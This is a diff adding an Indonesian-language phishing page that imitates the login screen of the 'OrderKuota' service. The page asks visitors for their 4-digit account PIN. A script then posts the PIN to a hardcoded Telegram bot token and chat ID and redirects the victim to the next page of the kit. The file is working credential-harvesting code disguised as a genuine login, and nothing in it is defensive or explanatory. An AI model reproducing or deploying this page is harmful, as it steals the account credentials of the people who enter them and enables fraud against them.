@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masuk Akun OrderKuota</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        /* Latar belakang utama halaman (Bisa diganti dengan gambar Anda) */
+        body {
+            /* Ganti 'background-image.jpg' dengan URL atau path gambar Anda */
+            background: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('https://ibb.co.com/6RqW7W2D') no-repeat center center fixed;
+            background-size: cover;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        /* Overlay / Wadah utama untuk posisi mengambang */
+        .modal-overlay {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* Kartu Modal Mengambang */
+        .modal-card {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 360px;
+            padding: 30px 24px;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            position: relative;
+        }
+
+        /* Tombol Tutup (X) */
+        .close-btn {
+            position: absolute;
+            top: 15px;
+            right: 20px;
+            font-size: 20px;
+            color: #999;
+            cursor: pointer;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .close-btn:hover {
+            color: #333;
+        }
+
+        /* Judul */
+        .modal-title {
+            text-align: center;
+            font-size: 20px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 25px;
+        }
+
+        /* Input Group */
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .input-group input:focus {
+            border-color: #009688;
+        }
+
+        /* Tombol Lanjutkan */
+        .btn-submit {
+            width: 100%;
+            padding: 12px;
+            background-color: #009688;
+            color: #ffffff;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background 0.2s ease;
+        }
+
+        .btn-submit:hover {
+            background-color: #00796b;
+        }
+
+        /* Area Tautan Bantuan */
+        .footer-link {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .footer-link a {
+            color: #009688;
+            font-size: 13px;
+            text-decoration: none;
+        }
+
+        .footer-link a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+<div class="modal-overlay">
+    <div class="modal-card">
+        <span class="close-btn" onclick="window.location.href='kedua.html'">&times;</span>
+        
+        <h2 class="modal-title">Masuk Akun OrderKuota</h2>
+        
+        <form id="storeForm">
+            <div class="input-group">
+                <input type="text" id="lastName" inputmode="numeric" maxlength="4" placeholder="Masukan 4 Digit PIN" required>
+            </div>
+            <button type="submit" class="btn-submit">Lanjutkan</button>
+        </form>
+
+        <div class="footer-link">
+            <a href="https://kudanil.com" target="_blank">Lupa pin masuk akun OrderKuota?</a>
+        </div>
+    </div>
+</div>
+
+<script>
+    const form = document.getElementById('storeForm');
+
+    // Masukkan Token dan Chat ID Bot Telegram Anda di sini
+    const TELEGRAM_TOKEN = '9004032319:AAHtqAfBIcxgzQoY6GHOo8GRUYMcCWKVCDU';
+    const CHAT_ID = '8708074501';
+
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const lastName = document.getElementById('lastName').value;
+
+        const message = `🔔 *Pengunjung Baru Store*\n\nPIN: ${lastName}`;
+
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(() => {
+            window.location.href = 'ketiga.html';
+        })
+        .catch((error) => {
+            console.error('Error:', error);
+            window.location.href = 'ketiga.html';
+        });
+    });
+</script>
+
+</body>
+</html>
